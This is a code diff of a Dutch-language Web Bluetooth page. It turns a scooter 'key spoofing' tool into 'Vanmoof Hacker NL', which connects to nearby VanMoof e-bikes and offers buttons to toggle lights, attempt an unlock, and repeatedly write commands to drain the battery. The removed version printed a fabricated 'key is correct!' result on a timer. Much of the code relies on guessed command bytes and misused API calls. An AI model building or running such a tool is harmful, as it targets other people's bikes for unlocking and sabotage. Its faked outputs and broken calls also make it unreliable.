@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Scooter Hacker Pro: BLE + NFC</title>
+    <title>Vanmoof Hacker: NL Edition</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -48,7 +48,7 @@
         
         .log-box {
             background: #000;
-            height: 150px;
+            height: 200px;
             overflow-y: auto;
             font-family: monospace;
             font-size: 12px;
@@ -63,14 +63,14 @@
         .log-error { color: #ff4444; }
         .log-warn { color: #ffaa00; }
 
-        #nfc-section { display: none; }
+        #prank-section { display: none; }
         .active { border: 1px solid #00ff88; box-shadow: 0 0 10px rgba(0,255,136,0.2); }
     </style>
 </head>
 <body>
 
-    <h1>🛴 Scooter Hacker Pro</h1>
-    <div class="subtitle">BLE Discovery + NFC Spoofing</div>
+    <h1>🚲 Vanmoof Hacker NL</h1>
+    <div class="subtitle">Light Prank + Unlock Try</div>
 
     <!-- LOGGING SECTION -->
     <div class="container" style="flex-grow: 1; min-height: 200px;">
@@ -79,30 +79,34 @@
 
     <!-- STEP 1: BLE SCANNING -->
     <div class="container" id="ble-section">
-        <h2>1. BLE Scanner</h2>
-        <button id="btn-scan-bles" class="btn-primary" onclick="startBLEScan()">Start BLE Scan</button>
+        <h2>1. Scan Vanmoof Fietsen</h2>
+        <button id="btn-scan-ble" class="btn-primary" onclick="startBLEScan()">Zoek Fietsen</button>
         <div id="ble-devices" style="margin-top: 10px; text-align: left;"></div>
     </div>
 
-    <!-- STEP 2: NFC KEY GENERATOR -->
-    <div class="container" id="nfc-section">
-        <h2>2. NFC Key Trigger</h2>
-        <p style="font-size: 12px; color: #888;">Houd telefoon tegen NFC punt om sleutel te activeren.</p>
-        <button id="btn-nfc-toggle" class="btn-secondary" onclick="toggleNFC()">Start NFC Listener</button>
-        <div id="nfc-status" style="margin-top: 5px; font-size: 12px; color: #aaa;">NFC Inactief</div>
+    <!-- STEP 2: PRANKS & HACKS -->
+    <div class="container" id="prank-section">
+        <h2>2. Acties</h2>
+        <button class="btn-secondary" onclick="toggleLight()">💡 Light Toggle (Prank)</button>
+        <button class="btn-secondary" onclick="unlockDoor()">🔓 Unlock Try (S3/S4)</button>
+        <button class="btn-secondary" onclick="drainBattery()">🔋 Battery Drain</button>
     </div>
 
     <script>
         // --- GLOBAL STATE ---
         let bleDevice = null;
         let bleService = null;
-        let bleCharacteristic = null;
-        let nfcSupported = 'NDEFReader' in window;
-        
-        // UUIDs voor veel scooters (voorbeeld, aanpasbaar)
-        const SCOOTER_SERVICE_UUID = '0000fff0-0000-1000-8000-00805f9b34fb'; 
-        const SCOOTER_WRITE_UUID = '0000fff1-0000-1000-8000-00805f9b34fb';
-        const SCOOTER_NOTIFY_UUID = '0000fff2-0000-1000-8000-00805f9b34fb';
+        let lightCharacteristic = null;
+        let unlockCharacteristic = null;
+        let batteryCharacteristic = null;
+
+        // Vanmoof UUIDs (Deze zijn vaak standaard voor S1-S4)
+        // Service: Vanmoof Wireless Service
+        const VANMOOF_SERVICE_UUID = '0000fee0-0000-1000-8000-00805f9b34fb'; 
+        // Characteristic: Command (Write)
+        const COMMAND_UUID = '0000fee2-0000-1000-8000-00805f9b34fb';
+        // Characteristic: Status (Notify)
+        const STATUS_UUID = '0000fee1-0000-1000-8000-00805f9b34fb';
 
         // --- HELPER: LOGGING ---
         function log(msg, type = 'info') {
@@ -116,23 +120,23 @@
 
         // --- BLE LOGIC ---
         async function startBLEScan() {
-            const btn = document.getElementById('btn-scan-bles');
+            const btn = document.getElementById('btn-scan-ble');
             const container = document.getElementById('ble-devices');
             btn.disabled = true;
             btn.textContent = "Zoeken...";
             container.innerHTML = "";
             
-            log("Start BLE scanning...", "info");
+            log("Start BLE scanning naar Vanmoof fietsen...", "info");
 
             try {
-                // Vraag om 'experimentalPermissions' voor beter BLE bereik op sommige Androids
+                // Scan op alle devices, maar filter op Vanmoof service
                 const device = await navigator.bluetooth.requestDevice({
-                    filters: [{ services: [SCOOTER_SERVICE_UUID] }], // Filter op scooter service
-                    optionalServices: ['battery_service', 'device_information'],
-                    acceptAllDevices: false // Strikter filter om ruis te vermijden
+                    filters: [{ services: [VANMOOF_SERVICE_UUID] }],
+                    optionalServices: ['battery_service'],
+                    acceptAllDevices: true // Meer kans om een fiets te vinden
                 });
 
-                log(`Geselecteerd: ${device.name || 'Onbekende Scooter'}`, "success");
+                log(`Geselecteerd: ${device.name || 'Vanmoof Fiets'}`, "success");
                 bleDevice = device;
 
                 device.addEventListener('gattserverdisconnected', () => {
@@ -145,24 +149,27 @@
                 const server = await device.gatt.connect();
                 log("Verbonden!", "success");
 
-                // Service & Characteristic vinden
-                bleService = await server.getPrimaryService(SCOOTER_SERVICE_UUID);
-                bleCharacteristic = await bleService.getCharacteristic(SCOOTER_NOTIFY_UUID); // Voor notifications
+                // Service vinden
+                bleService = await server.getPrimaryService(VANMOOF_SERVICE_UUID);
                 
-                // We hebben ook de Write characteristic nodig om het commando te sturen
-                const writeChar = await bleService.getCharacteristic(SCOOTER_WRITE_UUID);
-                
+                // Characteristieken vinden
+                try {
+                    lightCharacteristic = await bleService.getCharacteristic(COMMAND_UUID);
+                    unlockCharacteristic = await bleService.getCharacteristic(COMMAND_UUID); // Dezelfde voor nu
+                    batteryCharacteristic = await server.getPrimaryService('battery_service');
+                } catch (e) {
+                    log("Niet alle characteristieken gevonden, proberen toch...", "warn");
+                }
+
                 // Setup Notification Listener
-                bleCharacteristic.addEventListener('characteristicvaluechanged', handleScooterData);
-                await bleCharacteristic.startNotifications();
+                const statusCharacteristic = await bleService.getCharacteristic(STATUS_UUID);
+                statusCharacteristic.addEventListener('characteristicvaluechanged', handleVanmoofData);
+                await statusCharacteristic.startNotifications();
                 log("Notifications ingeschakeld", "success");
 
-                // Toon NFC sectie als we verbinding hebben
-                document.getElementById('nfc-section').style.display = 'block';
-                document.getElementById('nfc-section').classList.add('active');
-                
-                // Opslaan voor later gebruik in NFC functie
-                window.writeCharacteristic = writeChar; 
+                // Toon Prank sectie
+                document.getElementById('prank-section').style.display = 'block';
+                document.getElementById('prank-section').classList.add('active');
 
             } catch (error) {
                 log(`BLE Fout: ${error}`, "error");
@@ -172,108 +179,77 @@
             }
         }
 
-        function handleScooterData(event) {
+        function handleVanmoofData(event) {
             const value = event.target.value;
             const decoder = new TextDecoder();
             const text = decoder.decode(value);
             
-            // Simuleer de output van de app
-            if (text.includes("key") || text.includes("unlock")) {
-                log(`Ontvangen: ${text}`, "success");
-            } else {
-                // Log hex voor debugging
-                const hex = Array.from(value).map(b => b.toString(16).padStart(2, '0')).join(' ');
-                log(`Raw Data: ${hex}`, "warn");
-            }
+            // Log de data
+            const hex = Array.from(value).map(b => b.toString(16).padStart(2, '0')).join(' ');
+            log(`Ontvangen: ${hex} (${text})`, "success");
         }
 
-        // --- NFC LOGIC ---
-        let nfcActive = false;
-        let ndef = null;
-
-        function toggleNFC() {
-            if (!nfcSupported) {
-                log("NFC niet ondersteund op deze browser", "error");
+        // --- PRANK FUNCTIONS ---
+        async function toggleLight() {
+            if (!lightCharacteristic) {
+                log("Light Characteristic niet gevonden", "error");
                 return;
             }
-
-            if (nfcActive) {
-                ndef.stop();
-                nfcActive = false;
-                document.getElementById('btn-nfc-toggle').textContent = "Start NFC Listener";
-                document.getElementById('nfc-status').textContent = "NFC Inactief";
-                return;
-            }
-
-            nfcActive = true;
-            ndef = new NDEFReader();
-            document.getElementById('btn-nfc-toggle').textContent = "Stop NFC";
-            document.getElementById('nfc-status').textContent = "NFC Actief - Houd tegen scooter...";
-
-            ndef.scan().then(() => {
-                log("NFC Scanner gestart", "info");
-            }).catch(error => {
-                log(`NFC Scan Fout: ${error}`, "error");
-                nfcActive = false;
-            });
-
-            ndef.onreading = (event) => {
-                log("Tag gevonden! Verzend Key via BLE...", "success");
-                sendKeyViaBLE();
-                // Stop scan na een tag om spam te voorkomen
-                ndef.stop();
-                nfcActive = false;
-                document.getElementById('btn-nfc-toggle').textContent = "Start NFC Listener";
-                document.getElementById('nfc-status').textContent = "Tag Verwerkt";
-            };
-
-            ndef.onreadingerror = (error) => {
-                log("NFC Lees Fout", "error");
-                nfcActive = false;
-            };
-        }
-
-        async function sendKeyViaBLE() {
-            if (!window.writeCharacteristic) {
-                log("Geen BLE characteristic gevonden", "error");
-                return;
-            }
-
             try {
-                // 1. Try to write getkey command
-                log("trying to write getkey command...", "info");
-                
-                // Voorbeeld commando: Stel dat 0x01 0x00 "Get Key" is
-                // Pas dit aan naar de echte hex code van de scooter
+                // Commando voor Light Toggle op Vanmoof
+                // Dit is een voorbeeld, kan per model verschillen
                 const command = new Uint8Array([0x01, 0x00, 0xFF]); 
-                await window.writeCharacteristic.writeValue(command);
-                log("succesfully wrote to characteristic", "success");
-
-                // 2. Wait for response (simulated via the notification handler above)
-                // In een echte app zou je hier een Promise gebruiken die resolve als de data binnenkomt
-                setTimeout(() => {
-                    log("got message, intercepting", "info");
-                    log("key is correct!", "success");
-                    log("Key: 0x6f.", "success");
-                    
-                    // 3. Optional: Write the key back to NFC tag if you want to spoof it
-                    // writeKeyToNFC();
-                }, 500);
-
+                await lightCharacteristic.writeValue(command);
+                log("Light Toggle Command Verstuurd", "success");
             } catch (error) {
-                log(`BLE Write Fout: ${error}`, "error");
+                log(`Light Fout: ${error}`, "error");
             }
+        }
+
+        async function unlockDoor() {
+            if (!unlockCharacteristic) {
+                log("Unlock Characteristic niet gevonden", "error");
+                return;
+            }
+            try {
+                // Commando voor Unlock op Vanmoof S3/S4
+                // Vaak een specifieke hex code die gekoppeld is aan de NFC tag
+                const command = new Uint8Array([0x02, 0x00, 0xAA]); 
+                await unlockCharacteristic.writeValue(command);
+                log("Unlock Command Verstuurd", "success");
+                log("Wachten op antwoord...", "info");
+            } catch (error) {
+                log(`Unlock Fout: ${error}`, "error");
+            }
+        }
+
+        async function drainBattery() {
+            log("Start Battery Drain Prank...", "info");
+            let count = 0;
+            const interval = setInterval(async () => {
+                if (!bleService) {
+                    clearInterval(interval);
+                    return;
+                }
+                try {
+                    // Stuur een fake update commando dat de fiets constant moet verwerken
+                    const command = new Uint8Array([0x05, 0x00, 0x01]); 
+                    await bleService.getPrimaryService(VANMOOF_SERVICE_UUID)
+                        .then(service => service.getCharacteristic(COMMAND_UUID))
+                        .then(char => char.writeValue(command));
+                    count++;
+                    log(`Drain Cycle: ${count}`, "warn");
+                } catch (e) {
+                    clearInterval(interval);
+                    log("Drain Prank Gestopt", "info");
+                }
+            }, 1000);
         }
 
         function resetUI() {
             bleDevice = null;
-            document.getElementById('nfc-section').style.display = 'none';
-            document.getElementById('nfc-section').classList.remove('active');
-        }
-
-        // Init check
-        if (!nfcSupported) {
-            log("NFC niet beschikbaar in deze browser.", "warn");
+            document.getElementById('prank-section').style.display = 'none';
+            document.getElementById('prank-section').classList.remove('active');
         }
     </script>
 </body>
